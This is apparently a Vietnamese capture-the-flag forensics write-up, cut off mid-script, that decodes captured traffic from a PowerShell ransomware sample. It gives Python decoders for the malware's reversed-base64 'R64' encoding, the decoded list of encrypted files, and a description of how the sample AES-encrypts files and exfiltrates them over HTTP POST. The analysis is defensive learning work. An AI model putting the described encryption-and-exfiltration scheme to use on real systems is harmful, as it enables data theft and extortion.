## Urgent Tina (part 2)
Tiếp tục ta phân tích file logs nào, chúng ta chỉ cần `R64` cái `data` của `/logs` là xong
```python=
POST /logs HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237
Content-Type: application/x-www-form-urlencoded
Host: 192.168.240.1:443
Content-Length: 5700

kVGdwlncj5WZgc3buBycpByZwpmLy_TYykjN4_jYjNWO1YTM3cjNmJmZxgjMmFWZycjN5Y2X1cTO4YDOzIjM5kzMzoHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZwpmLtFmb0VWa2x1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagcGcq5iN1QzN5ATMt0WY0NXLuFWYpR3chJWZz1ycsVGelBHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZuBnLtlWbcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnauADM0gHMwQzXmdjYzoXLNpGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpBiZkBnLzVmc1R3YlRXaoNmch9FZuF2XzRnbl1WZylWdxVmcfNnbvlGdhJXZkl2cu92YfNWZTR1bJ9Ve0lmc1NWZz9FVvl_XzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL581ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdugzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL281ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyUzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyQzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduADNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyMzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Ny81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyIzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5Gcus2YhxmYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnaugzYyMTMmdzYkJWNykjMzAjMxkTY0QDMhRWY5MjNxQWYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnau42X1MjM5QzNyITO3IjN4kjN0IjM28FOzMTN4MjM4IjMwcDMzIzXzMjM4YzM4QjMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5GcuQWZ1YDN4UzYjZTMxgTNkNGZhFTNzMjY4cDZ1UWYiNTMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyW
```

```python=
#script
import base64

def reverse_r64_encoder(encoded_data):
    reversed_data = encoded_data[::-1]
    
    replaced_data = reversed_data.replace('-', 'C').replace('_', 'E')
    
    padding = 4 - (len(replaced_data) % 4)
    if padding < 4:
        replaced_data += '=='

    decoded_data = base64.b64decode(replaced_data)

    return decoded_data

B64Logs = "kVGdwlncj5WZgc3buBycpByZwpmLy_TYykjN4_jYjNWO1YTM3cjNmJmZxgjMmFWZycjN5Y2X1cTO4YDOzIjM5kzMzoHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZwpmLtFmb0VWa2x1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagcGcq5iN1QzN5ATMt0WY0NXLuFWYpR3chJWZz1ycsVGelBHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZuBnLtlWbcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnauADM0gHMwQzXmdjYzoXLNpGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpBiZkBnLzVmc1R3YlRXaoNmch9FZuF2XzRnbl1WZylWdxVmcfNnbvlGdhJXZkl2cu92YfNWZTR1bJ9Ve0lmc1NWZz9FVvl_XzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL581ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdugzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL281ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyUzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyQzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduADNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyMzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Ny81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyIzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5Gcus2YhxmYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnaugzYyMTMmdzYkJWNykjMzAjMxkTY0QDMhRWY5MjNxQWYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnau42X1MjM5QzNyITO3IjN4kjN0IjM28FOzMTN4MjM4IjMwcDMzIzXzMjM4YzM4QjMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5GcuQWZ1YDN4UzYjZTMxgTNkNGZhFTNzMjY4cDZ1UWYiNTMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyW" # $B64Logs

decoded_output = reverse_r64_encoder(B64Logs) # $RansomLogs
print(decoded_output.decode('utf-8', errors='ignore'))
```

Chúng ta sẽ được kết quả tường minh như sau 
```
[!] C:\Users\IEUser\Documents\13bae5d78b3351adcd58116cc58465ed.png is now encrypted 
[!] C:\Users\IEUser\Documents\248368233_230702282385338_6224698627922749235_n.jpg is now encrypted 
[!] C:\Users\IEUser\Documents\ad1639ada044a912032925bdc7f132c8.jpg is now encrypted 
[!] C:\Users\IEUser\Documents\black.png is now encrypted 
[!] C:\Users\IEUser\Documents\flag_1.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_10.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_11.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_12.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_13.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_14.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_15.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_16.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_17.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_18.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_19.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_2.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_20.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_21.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_22.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_23.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_24.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_25.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_26.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_27.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_28.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_29.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_3.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_30.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_31.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_32.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_33.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_34.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_35.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_36.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_37.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_38.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_39.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_4.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_40.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_41.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_42.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_43.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_44.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_45.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_46.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_47.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_48.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_49.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_5.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_50.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_51.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_52.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_53.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_54.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_55.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_56.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_57.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_58.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_59.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_6.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_7.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_8.txt is now encrypted 
[!] C:\Users\IEUser\Documents\flag_9.txt is now encrypted 
[!] C:\Users\IEUser\Documents\IoT_security_IoTSec_considerations_requirements_and_architectures.pdf is now encrypted 
[!] C:\Users\IEUser\Documents\jM-z3b7f_400x400.jpg is now encrypted 
[!] C:\Users\IEUser\Documents\mim.png is now encrypted 
[!] C:\Users\IEUser\Documents\pexels-sebastiaan-stam-1097456.jpg is now encrypted 
[!] C:\Users\IEUser\Documents\vietnam.jpg is now encrypted 
[!] C:\Users\IEUser\Documents\z3399223868975_f9672eaf281fbf6771659ccb18692a12.jpg is now encrypted
```

và đã thấy được file chứa flag :v: 
Tới đây ta cần phân tích kĩ lại xem nội dung file đã đi đâu, cụ thể chính là hàm `main` có 

![image](https://hackmd.io/_uploads/ryeML2ZJJe.png)

Tức là theo tiến trình thì file sẽ bị mã hóa bởi hàm `function EncryptFiles` nhưng vẫn chưa được gửi đi mà phải qua thêm hàm `function ExfiltrateFiles` để lọc lại và gửi đi `url` . Cụ thể hơn thì là nội dung các file đã bị mã hóa tại hàm `function EncryptFiles` bằng `Invoke-AESEncryption -Key $WiETm -Path $i` và sau đó lại bị mã hóa thêm 1 lần nữa `$B64file = R64Encoder -f $i` rồi mới được gửi đi kèm tên file bị mã hóa tương ứng. Vậy nội dung đã bị mã hóa 2 lần `AES -> R64` nên ta sẽ đi ngược để tìm `R64 -> AES`
Hình ảnh minh họa cho tiến trình 

![image](https://hackmd.io/_uploads/SkVlu3Wkyx.png)

ta có thể thấy các tiến trình đều có tên file và nội dung đã bị mã hóa và cụ thể hơn chính là tiến trình từ đoạn `logs` ta đã giải mã bên trên.

Đến đây ta sẽ lọc ra những tiến trình từ : `/files/j5WZuQHe05-Mx81ZhxmZ` vif đây chính là từ `flag_1.txt.enc` theo đoạn `logs` bên trên.

tôi đã dùng `script` này để dump ra theo cấu trúc `tenFIle : data` nhưng k được đẹp 
```python=
import pyshark

cap = pyshark.FileCapture('traffic.pcapng', display_filter='http.request.method == POST')

post_data = []

for packet in cap:
    if hasattr(packet, 'http'):
        url = packet.http.request_uri.split('/')[-1] 
        payload = packet.http.file_data if 'file_data' in packet.http.field_names else ""
        post_data.append(f"{url} : {payload}")

for entry in post_data:
    print(entry)

```
Do kết quả rất dài nên mình k show nhé! Cụ thể nó giống sau 

![image](https://hackmd.io/_uploads/By1B3nb1Jx.png)

Và sau sau đó mình viết lại `script` để `format` lại 

```python=
import base64

def reverse_r64_encoder(encoded_data):
    reversed_data = encoded_data[::-1]
    
    replaced_data = reversed_data.replace('-', 'C').replace('_', 'E')
    
    padding = 4 - (len(replaced_data) % 4) 
    if padding < 4:
        replaced_data += '=' * padding

    decoded_data = base64.b64decode(replaced_data)

    return decoded_data

def hex_to_ascii(hex_string):
    try:
        bytes_object = bytes.fromhex(hex_string)
        return bytes_object.decode('utf-8', errors='replace')
    except ValueError as e:
        print(f"Error converting hex to ASCII: {e}")
        return None 

def process_file(file_path):
    results = []
    with open(file_path, 'r') as file:
        for line in file:
            key, hex_values = line.split(':', 1)
            key = key.strip()
            hex_values = hex_values.strip()
            

            decoded_key = reverse_r64_encoder(key)
            hex_values_cleaned = ''.join(filter(lambda c: c in '0123456789abcdefABCDEF', hex_values.replace(' ', '')))
